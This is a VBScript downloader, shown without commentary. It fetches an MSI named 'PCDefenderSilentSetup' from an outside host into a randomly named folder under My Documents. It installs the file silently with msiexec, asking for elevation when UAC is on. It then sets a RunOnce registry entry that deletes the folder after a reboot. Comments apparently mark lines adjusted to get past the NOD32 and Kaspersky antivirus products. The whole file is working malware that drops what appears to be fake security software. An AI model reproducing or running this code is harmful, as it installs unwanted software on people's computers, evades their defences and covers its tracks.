Dim objFSO, objFolder
strDirectory = "" & getMyDocumentsPath & "\" & rndStr ' <- NOD32
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFolder = objFSO.CreateFolder(strDirectory)

downloadLink = "http://thekaksosat.info/PCDefenderSilentSetup.msi"
fileToDonwload = "" & rndStr & ".msi"
Download downloadLink, strDirectory, fileToDonwload ' <- KIS
Run fileToDonwload
deleteMsiAfterRestart strDirectory


Function Download(URL, Folder, Filename)
   Dim XMLHTTP, ADOStream
   
   URL = Replace(URL,"\","/")

   'If len(FileName) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set XMLHTTP = CREATEOBJECT("Microsoft.XMLHTTP") 
   XMLHTTP.open "GET", URL, "False" 

   XMLHTTP.send 
   If XMLHTTP.statustext = "OK" Then 
      Set ADOStream = CreateObject("ADODB.Stream") 
      ADOStream.type = 1 
      ADOStream.Open 
      ADOStream.Write XMLHTTP.responseBody 

      if len(Folder) > 0 Then FileName = Folder & "\" & FileName 
      ADOStream.SaveToFile FileName, 2 
      ADOStream.Close 
      Set ADOStream = Nothing 
      Download = 1
   End if 
   Set XMLHTTP = Nothing
End Function


Sub Run(ByVal sFile)
	Dim shell, strOS, strVerKey, strVersion, strUacKey, strUac
    Set Shell = CreateObject("WScript.Shell")
    strOS = shell.ExpandEnvironmentStrings("%OS%")
    If strOS = "Windows_NT" Then
       strVerKey = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"
       strVersion = Shell.regread(strVerKey & "CurrentVersion")
    Else
      strVerKey = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\"
      strVersion = Shell.regread(strVerKey & "VersionNumber")
    End if
    strVersion = Mid(strVersion,1,1)
    If (strVersion = 6) Then
       strUacKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\"
       strUac = Shell.regread(strUacKey & "EnableLUA")
    End If
    Set shell = Nothing

    If ((strVersion = 6) AND (strUac = 1)) Then
       Set shell = CreateObject("Shell.Application")
       shell.ShellExecute "msiexec", " /i " & Chr(34) & sFile & Chr(34) & " /quiet", "", "runas", 1
       Set shell = Nothing
    Else
       Set shell = CreateObject("Shell.Application")
       shell.ShellExecute "msiexec", " /i " & Chr(34) & sFile & Chr(34) & " /quiet", "", "open", 1
       Set shell = Nothing
    End If
End Sub


Function rndStr
	intUpperLimit = 14
	intLowerLimit = 7

	Randomize  
	intCharacters = Int(((intUpperLimit - intLowerLimit + 1) * Rnd) _
	    + intUpperLimit)  

	intUpperLimit = 90
	intLowerLimit = 65
	
	For i = 1 to intCharacters
	    Randomize
	    intASCIIValue = Int(((intUpperLimit - intLowerLimit + 1) * Rnd) _
	        + intLowerLimit)  
	    strPassword = strPassword & Chr(intASCIIValue)
	Next
	
	rndStr = strPassword
End Function


Function getMyDocumentsPath
	Set WshShell = Wscript.CreateObject("Wscript.Shell")
	getMyDocumentsPath = WshShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function deleteMsiAfterRestart(path)
	Set WshShell = Wscript.CreateObject("Wscript.Shell")
	WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & path & """", "REG_SZ"
End Function
